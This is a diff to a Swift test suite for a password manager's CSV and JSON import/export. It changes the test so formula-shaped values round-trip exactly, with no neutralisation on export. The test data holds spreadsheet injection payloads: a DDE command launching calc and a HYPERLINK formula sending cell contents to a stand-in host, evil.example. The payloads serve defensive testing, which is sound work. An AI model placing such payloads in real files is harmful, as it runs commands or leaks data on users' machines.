@@ -436,45 +436,52 @@ struct AdversarialInterchangeTests {
 
     // MARK: CSV
 
-    /// A7 plants a spreadsheet formula in a field, so that the plaintext export of the vault runs it when the
-    /// person opens the file in a spreadsheet (CSV injection). Export makes such cells inert; import keeps them.
-    @Test("CSV formula injection: import preserves the cell as data, export makes it inert")
+    /// A7 crafts values that look like spreadsheet formulas (`=`, `+`, `-`, `@`, a leading tab or carriage return) or
+    /// like a formula some exporter made inert (an apostrophe in front), hoping the import or a later export rewrites
+    /// them: a password changed by one byte locks the person out of that account in whatever imports the file. The
+    /// owner's decision (2026-11-16) is that the CSV is for an importer, never a spreadsheet, so every value goes in
+    /// and comes out exactly as written, and nothing is neutralised or un-neutralised on either side.
+    @Test("CSV formula-shaped values: imported exactly, exported exactly, byte for byte")
     func formulaInjection() throws {
         let payloads = [
-            "=cmd|' /C calc'!A0", "+1+1", "-2+3", "@SUM(1+1)*cmd|' /C calc'!A0", "\t=1+1",
-            "=HYPERLINK(\"http://evil.example?x=\"&A1)",
+            "=cmd|' /C calc'!A0", "+1", "-1", "@x", "\t=1+1", "\r=1+1", "'=1+1", "'-already-prefixed",
+            "@SUM(1+1)*cmd|' /C calc'!A0", "=HYPERLINK(\"http://evil.example?x=\"&A1)",
         ]
         var csv = "Title,URL,Username,Password,Notes,OTPAuth\r\n"
         for (index, payload) in payloads.enumerated() {
             let cell = "\"" + payload.replacingOccurrences(of: "\"", with: "\"\"") + "\""
-            csv += "\(cell),https://site\(index).example/,\(cell),\(cell),\(cell),\r\n"
+            csv += "Site \(index),https://site\(index).example/,\(cell),\(cell),\(cell),\r\n"
         }
         let imported = try importCSV(Array(csv.utf8))
         #expect(imported.entries.count == payloads.count)
-        for (entry, payload) in zip(imported.entries, payloads) {
-            #expect(entry.item.title == payload.trimmingCharacters(in: .whitespacesAndNewlines))
-            #expect(entry.item.fields.first { $0.kind == .username }?.value == payload)
-            #expect(entry.item.fields.first { $0.kind == .password }?.value == payload)
-            #expect(entry.item.notes == payload)
+        #expect(imported.report.warnings.isEmpty)
+        func exact(_ items: [Item]) {
+            for (item, payload) in zip(items, payloads) {
+                let bytes = Array(payload.utf8)
+                #expect(item.fields.first { $0.kind == .username }.map { Array($0.value.utf8) } == bytes)
+                #expect(item.fields.first { $0.kind == .password }.map { Array($0.value.utf8) } == bytes)
+                #expect(Array(item.notes.utf8) == bytes)
+            }
         }
-        // Exported, no cell begins with a character a spreadsheet would act on.
+        exact(imported.entries.map(\.item))
+
+        // Exported, each cell is the stored value with RFC 4180 quoting only, and the report changes nothing.
         let exported = PasswordCSV.exportApplePasswords(imported.entries.map(\.item))
+        #expect(exported.report.warnings.isEmpty)
         let rows = try CSVReader.parse(exported.bytes)
         #expect(rows.count == payloads.count + 1)
-        for row in rows.dropFirst() {
-            for cell in row.fields {
-                #expect(!CSVWriter.isFormulaLike(cell), "\(cell)")
-            }
-            #expect(row.fields[3].hasPrefix("'"))
+        for (row, payload) in zip(rows.dropFirst(), payloads) {
+            #expect(row.fields[2...4].map { Array($0.utf8) } == Array(repeating: Array(payload.utf8), count: 3))
         }
-        #expect(exported.report.warnings.count >= payloads.count * 3)
+        // And the file imports again as the same bytes.
+        exact(try importCSV(exported.bytes).entries.map(\.item))
         // 1PUX and CXF exports are JSON, where nothing is evaluated: the values are written unchanged.
         let json = CredentialExchange.exportDocument(
             imported.entries.map(\.item),
             options: CredentialExchange.ExportOptions(
                 exporterRelyingPartyID: "watchword.example", accountID: Self.vaultID,
                 timestamp: Date(timeIntervalSince1970: 0)))
-        #expect(String(decoding: json.bytes, as: UTF8.self).contains(#""value":"+1+1""#))
+        #expect(String(decoding: json.bytes, as: UTF8.self).contains(#""value":"+1""#))
     }
 
     /// A7 hides record structure inside quoted cells, hoping a naive reader splits on the line breaks.
